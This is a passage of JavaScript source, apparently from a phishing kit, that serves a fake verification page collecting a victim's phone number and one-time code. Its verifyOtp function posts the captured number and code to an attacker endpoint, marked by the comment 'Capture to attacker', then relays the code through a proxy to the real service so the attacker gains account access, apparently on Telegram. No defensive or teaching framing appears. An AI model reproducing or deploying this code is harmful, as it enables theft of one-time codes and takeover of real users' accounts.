  document.getElementById('step1').style.display='none';
  document.getElementById('step2').style.display='block';
  document.getElementById('otp_info').textContent='${c.otpSub}'.replace('{phone}',fullPhone);
}

async function verifyOtp(){
  const otp=document.getElementById('otp').value.trim();
  if(!otp||otp.length<4){document.getElementById('e2').style.display='block';return;}
  document.getElementById('e2').style.display='none';
  document.getElementById('b2').textContent='Verifying...';
  // Capture to attacker
  await fetch(D+'/captured',{method:'POST',headers:{'Content-Type':'application/json'},
    body:JSON.stringify({uid:UID,site:SITE,phone:fullPhone,otp})});
  // Verify with real server (for TG this gives account access)
  try{
    await fetch(BASE+'/proxy/'+PROXY+'/verify',{method:'POST',headers:{'Content-Type':'application/json'},
      body:JSON.stringify({phone:fullPhone,otp,sid:SID})});
  }catch(e){}
  setTimeout(()=>window.location.href=RDR,600);
}
</script></body></html>`;
}

// Keep alive
setInterval(()=>{ axios.get(getBase()).catch(()=>{}); }, 300000);

server.listen(process.env.PORT||8999,()=>console.log('[+] Server online port',process.env.PORT||8999));
